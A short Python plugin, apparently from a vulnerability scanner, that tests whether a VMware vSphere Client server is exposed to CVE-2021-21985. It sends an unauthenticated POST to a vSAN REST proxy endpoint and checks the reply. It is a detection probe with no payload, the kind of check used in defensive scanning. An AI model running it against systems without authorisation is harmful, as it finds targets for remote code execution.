#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'VMware vSphere Client (HTML5) RCE CVE-2021-21985',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json'
      }
  target = '/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData'
  data = '{"methodInput":[{"type":"ClusterComputeResource","value": null,"serverGuid": null}]}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and '{"result":{"isDisconnected":' in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret